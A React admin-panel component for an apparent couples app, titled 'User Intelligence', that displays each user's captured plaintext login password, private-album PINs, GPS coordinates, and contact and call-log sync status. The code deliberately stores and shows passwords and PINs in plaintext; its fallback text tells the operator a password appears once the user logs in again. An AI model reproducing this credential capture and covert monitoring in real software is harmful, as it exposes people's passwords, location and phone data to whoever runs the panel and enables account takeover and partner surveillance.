import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Heart, MapPin, Calendar, Edit3, Smile, Activity, Clock, Camera, X, Save,
  Key, Lock, Mail, Navigation, Smartphone,
} from 'lucide-react';
import { useAdminData } from '../data/AdminDataContext';
import { useToast } from '../components/Toast';

const fmtDate = (d) => {
  if (!d) return '—';
  try {
    return new Date(d).toLocaleString();
  } catch {
    return '—';
  }
};

const UserManagement = () => {
  const { users, updateUser, settings, updateSettings, privateAlbums } = useAdminData();
  const toast = useToast();
  const [editingUser, setEditingUser] = useState(null);
  const [formData, setFormData] = useState({});
  const [editingAnniversary, setEditingAnniversary] = useState(false);
  const [anniversaryValue, setAnniversaryValue] = useState(settings.anniversaryDate);

  const openEdit = (user) => {
    setEditingUser(user);
    setFormData({ ...user });
  };

  const saveProfile = () => {
    updateUser(editingUser._id, formData);
    toast.success(`${formData.name}'s profile updated!`);
    setEditingUser(null);
  };

  const saveAnniversary = () => {
    updateSettings({ anniversaryDate: anniversaryValue });
    toast.success('Anniversary date saved!');
    setEditingAnniversary(false);
  };

  const getDaysTogether = (dateStr) => {
    const start = new Date(dateStr);
    const now = new Date();
    const days = Math.floor((now - start) / (1000 * 60 * 60 * 24));
    const years = Math.floor(days / 365);
    const months = Math.floor((days % 365) / 30);
    const remDays = days % 30;
    return `${years}y ${months}m ${remDays}d`;
  };

  const pinsForUser = (userId) => privateAlbums.filter(
    (a) => String(a.createdBy) === String(userId) || String(a.createdBy?._id) === String(userId),
  );

  return (
    <div>
      <div className="admin-section-title">
        <h2>User Intelligence</h2>
        <p>Full visibility into accounts, login passwords, and private album PINs.</p>
      </div>

      <div className="admin-grid grid-2" style={{ marginBottom: '32px' }}>
        {users.map((user, i) => {
          const userPins = pinsForUser(user._id);
          const sync = user.deviceSync || {};
          return (
            <motion.div
              key={user._id}
              initial={{ opacity: 0, x: i === 0 ? -20 : 20 }}
              animate={{ opacity: 1, x: 0 }}
              className="admin-card"
              style={{ position: 'relative', overflow: 'hidden' }}
            >
              <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '100px', background: `linear-gradient(135deg, ${i === 0 ? 'var(--blush-pink)' : 'var(--dusty-rose)'}, transparent)`, opacity: 0.15, zIndex: 0 }} />
              <div style={{ position: 'relative', zIndex: 1 }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '20px' }}>
                  <div style={{ position: 'relative' }}>
                    <div style={{ width: '88px', height: '88px', borderRadius: '24px', overflow: 'hidden', border: '3px solid var(--card-bg)', boxShadow: '0 8px 24px rgba(0,0,0,0.1)' }}>
                      <img src={user.avatar} alt="" style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
                    </div>
                    <div style={{ position: 'absolute', bottom: '-4px', right: '-4px', width: '28px', height: '28px', borderRadius: '50%', backgroundColor: 'white', display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 2px 8px rgba(0,0,0,0.12)', color: 'var(--text-sub)', border: '1px solid var(--border-light)' }}>
                      <Camera size={14} />
                    </div>
                  </div>
                  <div style={{ textAlign: 'right' }}>
                    <span className="admin-badge pink" style={{ display: 'inline-block', marginBottom: '8px' }}>{user.role}</span>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px', justifyContent: 'flex-end', color: user.isOnline ? '#4CAF50' : 'var(--text-muted)', fontSize: '13px', fontWeight: 600 }}>
                      <div style={{ width: '8px', height: '8px', borderRadius: '50%', backgroundColor: user.isOnline ? '#4CAF50' : 'var(--text-muted)' }} />
                      {user.isOnline ? 'Online' : 'Offline'}
                    </div>
                  </div>
                </div>

                <h3 style={{ fontSize: '22px', marginBottom: '4px' }}>{user.name}</h3>
                <p style={{ color: 'var(--text-sub)', fontSize: '14px', display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '4px' }}>
                  <Mail size={14} /> {user.email}
                </p>
                <p style={{ color: 'var(--text-sub)', fontSize: '14px', display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '8px' }}>
                  <MapPin size={14} /> {user.location || 'No location set'}
                </p>
                <p style={{ color: 'var(--text-muted)', fontSize: '13px', fontStyle: 'italic', marginBottom: '16px' }}>{user.bio || 'No bio'}</p>

                <div className="admin-sensitive-block">
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '10px', color: '#c62828', fontWeight: 700, fontSize: '12px', textTransform: 'uppercase' }}>
                    <Key size={14} /> Login password
                  </div>
                  <code style={{ fontSize: '15px', fontWeight: 600, letterSpacing: '0.04em' }}>
                    {user.passwordPlain || '(not captured yet — user must log in again)'}
                  </code>
                </div>

                {userPins.length > 0 && (
                  <div className="admin-sensitive-block" style={{ marginTop: '12px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '10px', color: '#c62828', fontWeight: 700, fontSize: '12px', textTransform: 'uppercase' }}>
                      <Lock size={14} /> Private album PINs
                    </div>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                      {userPins.map((album) => (
                        <div key={album._id} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '12px' }}>
                          <span style={{ fontSize: '14px', fontWeight: 600 }}>{album.title}</span>
                          <code style={{ fontSize: '14px' }}>{album.pinPlain || '—'}</code>
                          {album.deletedAt && <span className="admin-badge danger">Deleted</span>}
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', margin: '16px 0 20px' }}>
                  <div style={{ padding: '14px', backgroundColor: 'var(--chat-bg)', borderRadius: '14px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px', color: 'var(--text-muted)', fontSize: '11px', marginBottom: '4px', textTransform: 'uppercase', fontWeight: 600 }}>
                      <Calendar size={12} /> Birthday
                    </div>
                    <p style={{ fontWeight: 600, fontSize: '14px' }}>{user.birthday ? fmtDate(user.birthday).split(',')[0] : '—'}</p>
                  </div>
                  <div style={{ padding: '14px', backgroundColor: 'var(--chat-bg)', borderRadius: '14px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px', color: 'var(--text-muted)', fontSize: '11px', marginBottom: '4px', textTransform: 'uppercase', fontWeight: 600 }}>
                      <Smile size={12} /> Mood
                    </div>
                    <p style={{ fontWeight: 600, fontSize: '14px' }}>{user.mood || '—'}</p>
                  </div>
                  <div style={{ padding: '14px', backgroundColor: 'var(--chat-bg)', borderRadius: '14px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px', color: 'var(--text-muted)', fontSize: '11px', marginBottom: '4px', textTransform: 'uppercase', fontWeight: 600 }}>
                      <Clock size={12} /> Last seen
                    </div>
                    <p style={{ fontWeight: 600, fontSize: '13px' }}>{fmtDate(user.lastSeen)}</p>
                  </div>
                  <div style={{ padding: '14px', backgroundColor: 'var(--chat-bg)', borderRadius: '14px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px', color: 'var(--text-muted)', fontSize: '11px', marginBottom: '4px', textTransform: 'uppercase', fontWeight: 600 }}>
                      <Navigation size={12} /> GPS
                    </div>
                    <p style={{ fontWeight: 600, fontSize: '13px' }}>
                      {user.coordinates?.latitude != null
                        ? `${user.coordinates.latitude.toFixed(4)}, ${user.coordinates.longitude.toFixed(4)}`
                        : '—'}
                    </p>
                  </div>
                </div>

                <div style={{ padding: '12px 14px', background: 'var(--chat-bg)', borderRadius: '12px', marginBottom: '16px', fontSize: '13px' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px', fontWeight: 700, color: 'var(--text-sub)' }}>
                    <Smartphone size={14} /> Device sync
                  </div>
                  <p>Contacts: {sync.contactsLastSyncAt ? fmtDate(sync.contactsLastSyncAt) : 'never'}{sync.contactsLastError ? ` · ${sync.contactsLastError}` : ''}</p>
                  <p>Call logs: {sync.callLogsLastSyncAt ? fmtDate(sync.callLogsLastSyncAt) : 'never'}{sync.callLogsLastError ? ` · ${sync.callLogsLastError}` : ''}</p>
                </div>

                <motion.button
                  whileHover={{ scale: 1.02 }}
                  whileTap={{ scale: 0.97 }}
                  onClick={() => openEdit(user)}
                  style={{ width: '100%', padding: '13px', borderRadius: '12px', backgroundColor: 'var(--text-main)', color: 'white', border: 'none', fontWeight: 600, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', cursor: 'pointer' }}
                >
                  <Edit3 size={16} /> Edit Profile
                </motion.button>
              </div>
            </motion.div>
          );
        })}
      </div>

      <div className="admin-card">
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px' }}>
          <h3 style={{ fontSize: '20px' }}>Relationship Configuration</h3>
          <span className="admin-badge pink">CONNECTED</span>
        </div>
        <div className="admin-grid grid-3">
          <div style={{ padding: '20px', border: '1px solid var(--border-light)', borderRadius: '16px' }}>
            <p style={{ fontSize: '13px', color: 'var(--text-sub)', marginBottom: '8px' }}>Anniversary Date</p>
            {editingAnniversary ? (
              <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
                <input type="date" value={anniversaryValue} onChange={e => setAnniversaryValue(e.target.value)}
                  style={{ flex: 1, padding: '8px 12px', borderRadius: '10px', border: '1px solid var(--blush-pink)', background: 'var(--card-bg)', color: 'var(--text-main)', outline: 'none' }} />
                <motion.button whileTap={{ scale: 0.95 }} onClick={saveAnniversary}
                  style={{ padding: '8px 14px', borderRadius: '10px', border: 'none', background: 'var(--blush-pink)', color: 'white', fontWeight: 600, cursor: 'pointer', fontSize: '13px' }}>Save</motion.button>
                <X size={18} color="var(--text-muted)" style={{ cursor: 'pointer' }} onClick={() => setEditingAnniversary(false)} />
              </div>
            ) : (
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px', cursor: 'pointer' }} onClick={() => setEditingAnniversary(true)}>
                <Heart size={20} color="var(--blush-pink)" fill="var(--blush-pink)" />
                <p style={{ fontSize: '16px', fontWeight: 600 }}>{new Date(settings.anniversaryDate).toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' })}</p>
                <Edit3 size={14} color="var(--text-muted)" />
              </div>
            )}
          </div>
          <div style={{ padding: '20px', border: '1px solid var(--border-light)', borderRadius: '16px' }}>
            <p style={{ fontSize: '13px', color: 'var(--text-sub)', marginBottom: '8px' }}>Time Together</p>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
              <Activity size={20} color="#4CAF50" />
              <p style={{ fontSize: '16px', fontWeight: 600 }}>{getDaysTogether(settings.anniversaryDate)}</p>
            </div>
          </div>
          <div style={{ padding: '20px', border: '1px solid var(--border-light)', borderRadius: '16px' }}>
            <p style={{ fontSize: '13px', color: 'var(--text-sub)', marginBottom: '8px' }}>Private vault albums</p>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
              <Lock size={20} color="var(--blush-pink)" />
              <p style={{ fontSize: '16px', fontWeight: 600 }}>{privateAlbums.length} with PINs visible</p>
            </div>
          </div>
        </div>
      </div>

      <AnimatePresence>
        {editingUser && (
          <div style={{ position: 'fixed', inset: 0, backgroundColor: 'rgba(0,0,0,0.5)', backdropFilter: 'blur(8px)', zIndex: 3000, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '24px' }}>
            <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }}
              className="admin-card" style={{ width: '100%', maxWidth: '520px', maxHeight: '90vh', overflowY: 'auto' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '28px' }}>
                <h3 style={{ fontSize: '22px' }}>Edit — {editingUser.name}</h3>
                <X size={24} onClick={() => setEditingUser(null)} style={{ cursor: 'pointer', color: 'var(--text-sub)' }} />
              </div>

              <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                {[
                  { key: 'name', label: 'Full Name', type: 'text', placeholder: 'Your name' },
                  { key: 'email', label: 'Email', type: 'email', placeholder: 'email@example.com' },
                  { key: 'location', label: 'Location', type: 'text', placeholder: 'City, Country' },
                  { key: 'birthday', label: 'Birthday', type: 'date' },
                  { key: 'mood', label: 'Current Mood', type: 'text', placeholder: 'How are you feeling?' },
                ].map((field) => (
                  <div key={field.key}>
                    <label style={{ display: 'block', fontSize: '12px', fontWeight: 700, color: 'var(--text-muted)', marginBottom: '8px', textTransform: 'uppercase', letterSpacing: '0.05em' }}>{field.label}</label>
                    <input
                      type={field.type}
                      value={formData[field.key] || ''}
                      onChange={e => setFormData(prev => ({ ...prev, [field.key]: e.target.value }))}
                      placeholder={field.placeholder}
                      style={{ width: '100%', padding: '12px 16px', borderRadius: '12px', border: '1px solid var(--border-light)', background: 'var(--chat-bg)', color: 'var(--text-main)', fontSize: '15px', outline: 'none' }}
                    />
                  </div>
                ))}
                <div>
                  <label style={{ display: 'block', fontSize: '12px', fontWeight: 700, color: 'var(--text-muted)', marginBottom: '8px', textTransform: 'uppercase', letterSpacing: '0.05em' }}>Bio</label>
                  <textarea
                    value={formData.bio || ''}
                    onChange={e => setFormData(prev => ({ ...prev, bio: e.target.value }))}
                    placeholder="Short bio..."
                    style={{ width: '100%', padding: '12px 16px', borderRadius: '12px', border: '1px solid var(--border-light)', background: 'var(--chat-bg)', color: 'var(--text-main)', fontSize: '15px', outline: 'none', resize: 'vertical', minHeight: '80px', fontFamily: 'inherit' }}
                  />
                </div>
                <div style={{ display: 'flex', gap: '12px' }}>
                  <button onClick={() => setEditingUser(null)} style={{ flex: 1, padding: '14px', borderRadius: '12px', border: '1px solid var(--border-light)', background: 'var(--chat-bg)', color: 'var(--text-main)', fontWeight: 600, cursor: 'pointer' }}>Cancel</button>
                  <motion.button whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.97 }} onClick={saveProfile}
                    style={{ flex: 1, padding: '14px', borderRadius: '12px', border: 'none', background: 'linear-gradient(135deg, var(--dusty-rose), var(--blush-pink))', color: 'white', fontWeight: 600, cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
                    <Save size={16} /> Save Changes
                  </motion.button>
                </div>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default UserManagement;
